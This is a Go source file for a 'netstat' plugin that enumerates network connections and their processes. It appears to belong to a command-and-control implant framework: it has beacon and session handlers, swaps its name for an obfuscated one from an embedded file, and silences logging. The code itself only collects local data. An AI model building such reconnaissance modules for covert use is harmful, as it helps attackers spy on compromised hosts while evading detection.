package main

import (
	_ "embed"
	"encoding/json"
	"fmt"
	"io"
	"sort"
	"strings"

	"src/Client/generic/config"
	Logger "src/Client/generic/logger"

	gnet "github.com/shirou/gopsutil/v3/net"
	"github.com/shirou/gopsutil/v3/process"

	"src/Client/dynamic/shared"

	hclog "github.com/hashicorp/go-hclog"
	"github.com/hashicorp/go-plugin"
)

//go:embed obfuscate.json
var obfuscateJSON []byte

var pluginName string

const pluginKey = "netstat"

func init() {
	pluginName = pluginKey

	type entry struct {
		ObfuscatedName string `json:"obfuscated_name"`
	}
	var m map[string]entry
	if err := json.Unmarshal(obfuscateJSON, &m); err == nil {
		if e, ok := m[pluginKey]; ok {
			if n := strings.TrimSpace(e.ObfuscatedName); n != "" {
				pluginName = n
			}
		}
	}
}

type connectionInfo struct {
	Proto         string `json:"proto"`
	LocalAddress  string `json:"local_address"`
	LocalPort     uint32 `json:"local_port"`
	RemoteAddress string `json:"remote_address"`
	RemotePort    uint32 `json:"remote_port"`
	State         string `json:"state"`
	PID           int32  `json:"pid"`
	ProcessName   string `json:"process"`
}

// --- Collection helpers ---

func resolveProcName(pid int32) string {
	if pid <= 0 {
		return ""
	}
	p, err := process.NewProcess(pid)
	if err != nil {
		return ""
	}
	name, err := p.Name()
	if err != nil {
		return ""
	}
	return name
}

func collect(kind, proto string) []connectionInfo {
	conns, err := gnet.Connections(kind)
	if err != nil {
		Logger.Warn(fmt.Sprintf("Could not get %s connections: %v", kind, err))
		return nil
	}
	results := make([]connectionInfo, 0, len(conns))
	for _, c := range conns {
		ci := connectionInfo{
			Proto:         proto,
			LocalAddress:  c.Laddr.IP,
			LocalPort:     c.Laddr.Port,
			RemoteAddress: c.Raddr.IP,
			RemotePort:    c.Raddr.Port,
			State:         c.Status,
			PID:           c.Pid,
		}
		if ci.ProcessName == "" {
			ci.ProcessName = resolveProcName(ci.PID)
		}
		results = append(results, ci)
	}
	return results
}

func getAllConnections() []connectionInfo {
	Logger.Log("Gathering connection list (tcp, tcp6, udp, udp6)...")
	var all []connectionInfo
	all = append(all, collect("tcp", "tcp")...)
	all = append(all, collect("tcp6", "tcp6")...)
	all = append(all, collect("udp", "udp")...)
	all = append(all, collect("udp6", "udp6")...)

	// Sort for stable output: proto, state, laddr, raddr
	sort.Slice(all, func(i, j int) bool {
		if all[i].Proto != all[j].Proto {
			return all[i].Proto < all[j].Proto
		}
		if all[i].State != all[j].State {
			return all[i].State < all[j].State
		}
		if all[i].LocalAddress != all[j].LocalAddress {
			return all[i].LocalAddress < all[j].LocalAddress
		}
		if all[i].LocalPort != all[j].LocalPort {
			return all[i].LocalPort < all[j].LocalPort
		}
		if all[i].RemoteAddress != all[j].RemoteAddress {
			return all[i].RemoteAddress < all[j].RemoteAddress
		}
		if all[i].RemotePort != all[j].RemotePort {
			return all[i].RemotePort < all[j].RemotePort
		}
		return all[i].PID < all[j].PID
	})
	Logger.Log(fmt.Sprintf("Collected %d connections", len(all)))
	return all
}

// NetstatString returns a human-readable table of connections similar to `netstat -tunap`.
func NetstatString() string {
	conns := getAllConnections()
	header := fmt.Sprintf("%-5s %-22s %-22s %-12s %-7s %s", "Proto", "Local Address", "Remote Address", "State", "PID", "Process")
	lines := make([]string, 0, len(conns)+2)
	lines = append(lines, header)
	lines = append(lines, strings.Repeat("-", len(header)))
	for _, c := range conns {
		l := c.LocalAddress
		if c.LocalPort != 0 {
			l = fmt.Sprintf("%s:%d", l, c.LocalPort)
		}
		r := c.RemoteAddress
		if c.RemotePort != 0 {
			r = fmt.Sprintf("%s:%d", r, c.RemotePort)
		}
		line := fmt.Sprintf("%-5s %-22s %-22s %-12s %-7d %s", c.Proto, l, r, c.State, c.PID, c.ProcessName)
		lines = append(lines, line)
	}
	return strings.Join(lines, "\n")
}

// NetstatCommand implements the shared.SysinfoCommand interface.
type NetstatCommand struct{}

func (c *NetstatCommand) Execute(args []string) (string, error) {
	Logger.Log("NetstatCommand.Execute called (default context)")
	return NetstatString(), nil
}

func (c *NetstatCommand) ExecuteFromSession(args []string) (string, error) {
	Logger.Log("NetstatCommand.ExecuteFromSession called")
	output, err := c.Execute(args)
	if err != nil {
		Logger.Error(fmt.Sprintf("Error executing netstat in session context: %v", err))
		return "", err
	}
	return fmt.Sprintf("--- Netstat (Session Context) ---\n%s\n--------------------------------", output), nil
}

func (c *NetstatCommand) ExecuteFromBeacon(args []string, data string) (string, error) {
	Logger.Log(fmt.Sprintf("NetstatCommand.ExecuteFromBeacon called with data: %s", data))
	out, err := c.Execute(args)
	if err != nil {
		Logger.Error(fmt.Sprintf("Error executing netstat info in beacon context: %v", err))
		return "", err
	}
	Logger.Log(fmt.Sprintf("Beacon data received: %s", data))
	return fmt.Sprintf("--- Netstat Info (Beacon Context) ---\nBeacon Data: %s\n%s\n------------------------------------", data, out), nil
}

func main() {
	// Silence plugin logs unless in debug
	var plog hclog.Logger
	if config.IsDebug() {
		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin." + pluginName, Level: hclog.Debug})
	} else {
		plog = hclog.New(&hclog.LoggerOptions{Name: "plugin." + pluginName, Level: hclog.Off, Output: io.Discard})
	}

	plugin.Serve(&plugin.ServeConfig{
		HandshakeConfig: shared.HandshakeConfig,
		Plugins: map[string]plugin.Plugin{
			pluginName: &shared.CommandPlugin{Impl: &NetstatCommand{}},
		},
		Logger: plog,
	})
}
